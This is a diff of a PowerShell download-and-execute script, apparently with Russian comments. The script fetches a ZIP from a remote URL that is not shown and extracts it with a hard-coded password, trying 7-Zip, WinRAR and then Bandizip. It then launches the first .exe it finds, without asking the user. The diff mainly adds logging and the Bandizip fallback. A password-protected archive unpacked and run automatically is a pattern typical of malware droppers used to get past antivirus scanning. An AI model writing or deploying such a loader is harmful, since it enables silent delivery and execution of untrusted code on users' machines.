@@ -6,27 +6,75 @@ $password="5555"
 
 if(-not(Test-Path $targetFolder)){New-Item -ItemType Directory -Path $targetFolder -Force}
 
+Write-Host "Downloading..." -ForegroundColor Yellow
 try{
+    # Скачиваем файл
     Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
     $fileSize=(Get-Item $zipPath).Length
+    Write-Host "ZIP size: $([math]::Round($fileSize/1MB,2)) MB" -ForegroundColor Cyan
     
     if($fileSize -gt 0){
-        function Test-ExtractionSuccess{return(Test-Path $extractPath)-and(Get-ChildItem $extractPath -ErrorAction SilentlyContinue).Count -gt 0}
+        # Создаем папку для распаковки
+        if(Test-Path $extractPath){Remove-Item $extractPath -Recurse -Force}
+        New-Item -ItemType Directory -Path $extractPath -Force
         
+        # Метод 1: 7-Zip
+        Write-Host "Trying 7-Zip..." -ForegroundColor Yellow
         $7zipPaths=@("$env:ProgramFiles\7-Zip\7z.exe","${env:ProgramFiles(x86)}\7-Zip\7z.exe")
-        foreach($7zipPath in $7zipPaths){if(Test-Path $7zipPath){& $7zipPath x "-p$password" "-o$extractPath" "-y" $zipPath | Out-Null;if(Test-ExtractionSuccess){break}}}
-        
-        if(-not(Test-ExtractionSuccess)){
-            $winrarPaths=@("$env:ProgramFiles\WinRAR\WinRAR.exe","${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe")
-            foreach($winrarPath in $winrarPaths){if(Test-Path $winrarPath){& $winrarPath x "-p$password" "-y" "-ibck" $zipPath $extractPath | Out-Null;if(Test-ExtractionSuccess){break}}}
+        foreach($7zipPath in $7zipPaths){
+            if(Test-Path $7zipPath){
+                Write-Host "Using 7-Zip: $7zipPath" -ForegroundColor Gray
+                & $7zipPath x "-p$password" "-o$extractPath" "-y" $zipPath
+                break
+            }
         }
         
-        if(Test-ExtractionSuccess){
-            $exeFile=Get-ChildItem $extractPath | Where-Object{$_.Extension -eq '.exe'} | Select-Object -First 1
-            if($exeFile){Start-Process -FilePath "$extractPath\$($exeFile.Name)"}else{Invoke-Item $extractPath}
+        # Метод 2: WinRAR
+        if(-not(@(Get-ChildItem $extractPath -ErrorAction SilentlyContinue).Count -gt 0)){
+            Write-Host "Trying WinRAR..." -ForegroundColor Yellow
+            $winrarPaths=@("$env:ProgramFiles\WinRAR\WinRAR.exe","${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe")
+            foreach($winrarPath in $winrarPaths){
+                if(Test-Path $winrarPath){
+                    Write-Host "Using WinRAR: $winrarPath" -ForegroundColor Gray
+                    & $winrarPath x "-p$password" "-y" "-ibck" $zipPath $extractPath
+                    break
+                }
+            }
+        }
+        
+        # Метод 3: Bandizip
+        if(-not(@(Get-ChildItem $extractPath -ErrorAction SilentlyContinue).Count -gt 0)){
+            Write-Host "Trying Bandizip..." -ForegroundColor Yellow
+            $bandizipPaths=@("$env:ProgramFiles\Bandizip\Bandizip.exe","${env:ProgramFiles(x86)}\Bandizip\Bandizip.exe")
+            foreach($bandizipPath in $bandizipPaths){
+                if(Test-Path $bandizipPath){
+                    Write-Host "Using Bandizip: $bandizipPath" -ForegroundColor Gray
+                    & $bandizipPath x -p:"$password" -o:"$extractPath" -y $zipPath
+                    break
+                }
+            }
+        }
+        
+        # Проверяем результат
+        $extractedFiles=@(Get-ChildItem $extractPath -ErrorAction SilentlyContinue)
+        Write-Host "Extracted files: $($extractedFiles.Count)" -ForegroundColor Cyan
+        
+        if($extractedFiles.Count -gt 0){
+            Write-Host "SUCCESS! Files extracted:" -ForegroundColor Green
+            $extractedFiles | ForEach-Object { Write-Host " - $($_.Name) ($([math]::Round($_.Length/1KB,2)) KB)" -ForegroundColor Gray }
+            
+            # Запускаем EXE
+            $exeFile=$extractedFiles | Where-Object{$_.Extension -eq '.exe'} | Select-Object -First 1
+            if($exeFile){
+                Write-Host "Starting: $($exeFile.Name)" -ForegroundColor Green
+                Start-Process -FilePath "$extractPath\$($exeFile.Name)"
+            }
         }else{
-            Write-Host "Extraction failed - try manual extraction with password: $password"
+            Write-Host "FAILED: No files extracted" -ForegroundColor Red
+            Write-Host "Please extract manually with: $password" -ForegroundColor Yellow
             Invoke-Item $targetFolder
         }
     }
-}catch{Write-Host "Error: $_"}
+}catch{
+    Write-Host "Error: $_" -ForegroundColor Red
+}
